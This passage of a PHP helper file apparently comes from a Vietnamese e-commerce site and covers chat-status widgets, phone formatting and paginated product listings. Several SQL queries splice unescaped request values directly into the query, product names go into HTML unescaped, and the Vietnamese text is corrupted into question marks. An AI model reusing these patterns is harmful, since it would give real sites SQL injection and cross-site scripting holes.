	$giatri= $giatri . substr($chuoi,$vitri,1 );
}
return $giatri;
} 

function yahoo($nick_yahoo='',$icon='1'){
	
	$link = '<a href="ymsgr:sendIM?"'.$nick_yahoo.'"><img src="http://opi.yahoo.com/online?u="'.$nick_yahoo.'"&amp;m=g&amp;t="'.$icon.'""></a>';
	return $link;
}

function check_yahoo($nick_yahoo=''){
	$file = @fopen("http://opi.yahoo.com/online?u=".$nick_yahoo."&m=t&t=1","r");
	$read = @fread($file,200);
	
	if($read==false || strstr($read,"00"))
		$img = '<img src="../images/yahoo_offline.png" />';
	else
		$img = '<img src="../images/yahoo_online.png" />';
	return '<a href="ymsgr:sendIM?'.$nick_yahoo.'">'.$img.'</a>';
}

function skype($nick_skype='',$icon='1'){
	
	$link = '<a href="skype:"'.$nick_skype.'"?call><img src="http://mystatus.skype.com/bigclassic/"'.$nick_skype.'""></a>';
	return $link;
}

function check_skype($nick_skype=''){
	if(strlen(@file_get_contents("http://mystatus.skype.com/bigclassic/".$nick_skype))>2000)
	$img = '<img src="../images/skype_online.png" />';
	else
		$img = '<img src="../images/skype_offline.png" />';
	return '<a href="skype:'.$nick_skype.'?call">'.$img.'</a>';
}

/*
function doc3so($so)
{
    $achu = array ( " kh??ng "," m???t "," hai "," ba "," b???n "," n??m "," s??u "," b???y "," t??m "," ch??n " );
    $aso = array ( "0","1","2","3","4","5","6","7","8","9" );
    $kq = "";
    $tram = floor($so/100); // H??ng tr??m
    $chuc = floor(($so/10)%10); // H??ng ch???c
    $donvi = floor(($so%10)); // H??ng ????n v???
    if($tram==0 && $chuc==0 && $donvi==0) $kq = "";
    if($tram!=0)
    {
        $kq .= $achu[$tram] . " tr??m ";
        if (($chuc == 0) && ($donvi != 0)) $kq .= " l??? ";
    }
    if (($chuc != 0) && ($chuc != 1))
    {
            $kq .= $achu[$chuc] . " m????i";
            if (($chuc == 0) && ($donvi != 0)) $kq .= " linh ";
    }
    if ($chuc == 1) $kq .= " m?????i ";
    switch ($donvi)
    {
        case 1:
            if (($chuc != 0) && ($chuc != 1))
            {
                $kq .= " m???t ";
            }
            else
            {
                $kq .= $achu[$donvi];
            }
            break;
        case 5:
            if ($chuc == 0)
            {
                $kq .= $achu[$donvi];
            }
            else
            {
                $kq .= " n??m ";
            }
            break;
        default:
            if ($donvi != 0)
            {
                   $kq .= $achu[$donvi];
            }
            break;
    }
    if($kq=="")
    $kq=0;   
    return $kq;
}
function doctien($number)
{
$donvi=" ?????ng ";
$tiente=array("nganty" => " ngh??n t??? ","ty" => " t??? ","trieu" => " tri???u ","ngan" =>" ngh??n ","tram" => " tr??m ");
$num_f=$nombre_format_francais = number_format($number, 2, ',', ' ');
$vitri=strpos($num_f,',');
$num_cut=substr($num_f,0,$vitri);
$mang=explode(" ",$num_cut);
$sophantu=count($mang);
switch($sophantu)
{
    case '5':
            $nganty=doc3so($mang[0]);
            $text=$nganty;
            $ty=doc3so($mang[1]);
            $trieu=doc3so($mang[2]);
            $ngan=doc3so($mang[3]);
            $tram=doc3so($mang[4]);
            if((int)$mang[1]!=0)
            {
                $text.=$tiente['ngan'];
                $text.=$ty.$tiente['ty'];
            }
            else
            {
                $text.=$tiente['nganty'];
            }
            if((int)$mang[2]!=0)
                $text.=$trieu.$tiente['trieu'];
            if((int)$mang[3]!=0)
                $text.=$ngan.$tiente['ngan'];
            if((int)$mang[4]!=0)
                $text.=$tram;
            $text.=$donvi;
            return  $text;
            
            
    break;
    case '4':
            $ty=doc3so($mang[0]);
            $text=$ty.$tiente['ty'];
            $trieu=doc3so($mang[1]);
            $ngan=doc3so($mang[2]);
            $tram=doc3so($mang[3]);
            if((int)$mang[1]!=0)
                $text.=$trieu.$tiente['trieu'];
            if((int)$mang[2]!=0)
                $text.=$ngan.$tiente['ngan'];
            if((int)$mang[3]!=0)
                $text.=$tram;
            $text.=$donvi;
            return $text;
            
            
    break;
    case '3':
            $trieu=doc3so($mang[0]);
            $text=$trieu.$tiente['trieu'];
            $ngan=doc3so($mang[1]);
            $tram=doc3so($mang[2]);
            if((int)$mang[1]!=0)
                $text.=$ngan.$tiente['ngan'];
            if((int)$mang[2]!=0)
                $text.=$tram;
            $text.=$donvi;
            return $text;
    break;
    case '2':
            $ngan=doc3so($mang[0]);
            $text=$ngan.$tiente['ngan'];
            $tram=doc3so($mang[1]);
            if((int)$mang[1]!=0)
                $text.=$tram;
            $text.=$donvi;
            return $text;
                
    break;
    case '1':
            $tram=doc3so($mang[0]);
            $text=$tram.$donvi;
            return $text;
            
    break;
    default:
        echo "Xin l???i s??? qu?? l???n kh??ng th??? ?????i ???????c";
    break;
}
}

function doc_so($so)
{
    $so = preg_replace("([a-zA-Z{!@#$%^&*()_+<>?,.}]*)","",$so);
    if (strlen($so) <= 21)
    {
        $kq = "";
        $c = 0;
        $d = 0;
        $tien = array ( "", " ngh??n", " tri???u", " t???", " ngh??n t???", " tri???u t???", " t??? t???" );
        for ($i = 0; $i < strlen($so); $i++)
        {
            if ($so[$i] == "0")
                $d++;
            else break;
        }
        $so = substr($so,$d);
        for ($i = strlen($so); $i > 0; $i-=3)
        {
            $a[$c] = substr($so, $i, 3);
            $so = substr($so, 0, $i);
            $c++;
        }
        $a[$c] = $so;
        for ($i = count($a); $i > 0; $i--)
        {
            if (strlen(trim($a[$i])) != 0)
            {
                if (doc3so($a[$i]) != "")
                {
                    if (($tien[$i-1]==""))
                    {
                        if (count($a) > 2)
                            $kq .= " kh??ng tr??m l??? ".doc3so($a[$i]).$tien[$i-1];
                        else $kq .= doc3so($a[$i]).$tien[$i-1];
                    }
                    else if ((trim(doc3so($a[$i])) == "m?????i") && ($tien[$i-1]==""))
                    {
                        if (count($a) > 2)
                            $kq .= " kh??ng tr??m ".doc3so($a[$i]).$tien[$i-1];
                        else $kq .= doc3so($a[$i]).$tien[$i-1];
                    }
                    else
                    {
                    $kq .= doc3so($a[$i]).$tien[$i-1];
                    }
                }
            }
        }
        return $kq;
    }
    else
    {
        return "S??? qu?? l???n!";
    }
} 
*/ 

function format_phone_string( $raw_number ) {

    // remove everything but numbers
    $raw_number = preg_replace( '/\D/', '', $raw_number );

    // split each number into an array
    $arr_number = str_split($raw_number);

    // add a dummy value to the beginning of the array
    array_unshift( $arr_number, 'dummy' );

    // remove the dummy value so now the array keys start at 1
    unset($arr_number[0]);

    // get the number of numbers in the number
    $num_number = count($arr_number);

    // loop through each number backward starting at the end
    for ( $x = $num_number; $x >= 0; $x-- ) {

        if ( $x === $num_number - 3 || $x === $num_number - 6) {
            // before the fourth to last number

            $phone_number = "." . $phone_number;
        }
        /*else if ( $x === $num_number - 7 && $num_number > 7 ) {
            // before the seventh to last number
            // and only if the number is more than 7 digits

            $phone_number = ") " . $phone_number;
        }
        else if ( $x === $num_number - 10 ) {
            // before the tenth to last number

            $phone_number = "(" . $phone_number;
        }*/

        // concatenate each number (possibly with modifications) back on
        $phone_number = $arr_number[$x] . $phone_number;
    }

    return $phone_number;
}

function xoaHinhThem($type,$id){
	global $d;
	$d->reset();
	$sql="select id,thumb, photo from #_hinhanh where type='".$type."' and id_hinhanh=".$id;
 	$d->query($sql);
    $list =  $d->result_array();
    //x??a ???nh
    foreach ($list as $k => $v) {
    	$d->reset();
		$sql="delete from #_hinhanh where type='".$type."' and id=".$v['id'];
	 	$d->query($sql);
	 	delete_file(_upload_hinhthem.$v['photo']);
	 	delete_file(_upload_hinhthem.$v['thumb']);
    }
}
function getSanPhamIndex($iddm,$tranghientai){
global $d,$lang;
if($iddm == '') {
	return ''; 
}

	//l???y danh muc:
$d->reset();
$sql="select *, ten$lang as ten from #_product_danhmuc where hienthi=1 and noibat=1 and id=".$iddm;
$d->query($sql);
$item = $d->fetch_array();

echo '<div class="none" id="q_title">'.$item['title'].'</div>';
echo '<div class="none" id="q_keywords">'.$item['keywords'].'</div>';
echo '<div class="none" id="q_description">'.$item['description'].'</div>';
//echo 'V??o='.$vitridau;
//dem tong dong 

$sql="select *,ten$lang as ten from table_product where hienthi=1 and id_danhmuc='".$iddm."' and type='san-pham' and noibat=1 order by stt,id desc";


$d->query($sql);
//echo 'abc';exit();
$tongdong=$d->num_rows();
//echo 'tongdong='.$tongdong;
//S??? d??ng hi???n
$sodonghien=4;

$tongsotrang=ceil($tongdong/$sodonghien);//?????nh s??? trang
$vitridau = ($tranghientai-1)*$sodonghien;
//query
$sql="select *,ten$lang as ten from table_product where hienthi=1 and id_danhmuc='".$iddm."' and type='san-pham' and noibat=1 order by stt,id desc";

$sql.=' limit '.$vitridau.','.$sodonghien.'';
$d->query($sql);
$product = $d->result_array();	


/*===============================Xuat file=======================================*/
?> 
<div class="row">
	<?php for($j=0;$j<count($product);$j++){ ?>
	<div class="col-lg-3 col-sm-4 col-6 mb-30">
        <div class="item item_sanpham wow fadeIn" data-wow-duration="1s">
            <div class="item_img phong_to ">
                <a href="san-pham/<?=$product[$j]['tenkhongdau']?>.html">
                  <img src="thumb/400x400x1x90/<?=_upload_sanpham_l.$product[$j]['photo']?>" alt="<?=$product[$j]['ten']?>"  onError="this.src='http://placehold.it/400x400';"  />
                </a>
            </div>
            <h3 class="item_name">
              <a href="san-pham/<?=$product[$j]['tenkhongdau']?>.html"><?=$product[$j]['ten']?></a>
            </h3>
            <div class="item_gia">
              <?php
               	if($product[$j]['giakm']!=0){
               		echo '<span class="del-gia">'.number_format($product[$j]['gia'],0, ',', '.').'<sup>??</sup></span>';
               		echo '<span class="gia-ban">'.number_format($product[$j]['giakm'],0, ',', '.').'<sup>??</sup></span>';
               	}else{
               		if($product[$j]['gia']!=0){
               			echo '<span class="gia-ban">'.number_format($product[$j]['gia'],0, ',', '.').'<sup>??</sup></span>';
               		}else{
               			echo '<a href="lien-he.html" class="gia-ban">'._lienhe.'</a>';
               		}
                }
              ?> 
            </div>
            <div class="item_button">
                <div class="cart">
                    <button class="add-cart active" onclick="return addCart1(<?=$product[$j]['id']?>,'<?=$product[$j]['ten']?>')" data-id="<?=$product[$j]['id']?>" data-name="<?=$product[$j]['ten']?>">
                        <i class="fa fa-cart-plus"></i> <span class="mobi_none"> <?=_themvaogio?></span>
                    </button> 
                </div>
            </div>
        </div><!---END .item-->
    </div><!---END .col-->
    <?php }?>
</div>

<?php 
echo '<div class="clear"></div>';	
echo '<div class="pagination"><ul class="pages">';
	
if($tongsotrang>1){

	$trangtam=$tranghientai-1;
	if($tranghientai>1){
	echo '<li><a class="bam" vitri="0">&laquo;</a></li>';
	
	echo '<li><a class="bam" vitri="'.$trangtam.'">&#8249;</a></li>';
	}


$begin=$tranghientai-2;
$end=$tranghientai+2;
if($begin<1){$begin=1;}
if($end > $tongsotrang){$end=$tongsotrang;}

//echo $end;
for($i=$begin;$i<=$end;$i++){
	$trangtam=$i;
	if($tranghientai==$i){
	echo '<li><a class="bam" vitri="noactive" id="active_z">'.$i.'</a></li>';
	}else{
	echo '<li><a class="bam" vitri="'.$trangtam.'">'.$i.'</a></li>';
		
	}
	
}
if($tranghientai<$tongsotrang){
	$vitritam=$tranghientai+1;
	$vitricuoi=$tongsotrang-1;
	echo '<li><a class="bam" vitri="'.$vitritam.'">&#8250;</a></li>';
	echo '<li><a class="bam" vitri="'.$vitricuoi.'">&raquo;</a></li>';
	}

}

echo '</ul></div>'; 
}

function getThang($thang){
	global $lang;
	$arThangVi=array(
		'01' => 'Th??ng M???t','02' => 'Th??ng Hai','03' => 'Th??ng Ba','04' => 'Th??ng T??','05' => 'Th??ng N??m','06' => 'Th??ng S??u','07' => 'Th??ng B???y','08' => 'Th??ng T??m','09' => 'Th??ng Ch??n','10' => 'Th??ng M?????i','11' => 'Th??ng M?????i M???t','12' => 'Th??ng M?????i Hai',
	);
	$arThangEn=array(
		'01' => 'January','02' => 'February','03' => 'March','04' => 'April','05' => 'May','06' => 'June','07' => 'July','08' => 'August','09' => 'September','10' => 'October','11' => 'November','12' => 'December',
	);
	if($lang == ''){
		return $arThangVi[$thang];
	}else{
		return $arThangEn[$thang];
	}
}
function getAllProduct(){
	global $d;
	$d->reset();
	$sql="select *,ten$lang ten from #_product where type='san-pham' and hienthi=1 order by id desc";
	$d->query($sql);
	return $d->result_array();
}
function getHTTTById($id){
	global $d;
	$d->reset();
	$sql="select *,ten$lang ten from #_news where type='hinh-thuc-thanh-toan' and id= '".$id."'";
	$d->query($sql);
	$kq = $d->fetch_array();
	return  $kq['ten'];
}

?>